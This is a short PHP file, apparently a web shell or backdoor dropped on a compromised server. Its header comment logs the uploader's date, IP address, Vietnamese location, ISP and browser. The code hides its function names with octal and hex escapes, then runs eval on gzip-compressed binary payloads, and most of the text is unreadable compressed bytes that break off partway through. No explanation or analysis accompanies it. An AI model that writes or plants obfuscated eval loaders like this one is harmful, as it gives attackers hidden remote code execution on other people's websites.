<?php
/***
Date		:	2020-09-05 Saturday 11:18:24
Ipaddress		:	113.183.33.220
City		:	Ninh Bình
Country		:	VN
Region		:	Ninh Bình
Organization		:	VNPT Corp
User-Agent		:	Mozilla/5.0 (Linux; Android 10; SM-J600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile Safari/537.36
***/
if(!version_compare(PHP_VERSION,'5.6','>='))exit(eval("\145\x63\x68\157\x27\x52\x65\161"."u\x69"."r\x65\163\40"."P\110\x50\40\65\x2e\x36\x20\x6f\x72\x20\x68"."i\147\150\145\162\47\x3b"));$���ț�="\147\172\165\x6e\143\x6f\x6d\x70\x72\x65\163\163";eval($���ț�("xڵUAkA�Ox��6�d��ư�M���1�D!�5�J)�`�� i4
��T(VAJ-E�J+����@(9(�CH�(��=8;3���,��������{ߛ!��=Z�Ϟ9�uGG���p\"n�{\\<�\\f��Fz.��|�p�^�����2������+�go��q�	�w�x���ub]�p���Z�8�B�� �I�Hq�JKA��`p�(g6�P>r߳���2)]0|KB�ʒj!�}vU�t5��B�R:�c����у-�����YKc)�Rg[IIm*���3����kb�-@��o�@�Dd��N����-D�����1�h_�Stk��Y�1�4��)P�o����wX-�K��v���1į�:A|��� �A�,̎&L�D����>���������y�ygra:��|�W��Rmx��k���a���݌%��b6����8_��%�@&rO���������	IR��^<Z,����Qd9M���vR�E�F�����O�K�	��gO��0ŏ��Nt:I���
�2�/�U�~1ߪ��nH�N8��΄t�z���G�e{(؟.������-�H�-)!��Ήeu�����W���\$/�>��}�cN�m�o{���� 9�!�/xU����)[#�j)�n+�ŘQw�ч�pfo"))^eval($���ț�("x����0��GS�>�X�h�:�d��Դ̼T
�������@]'�� '?%UC)��@I'>����5>^Ǡ�H3ڠ�
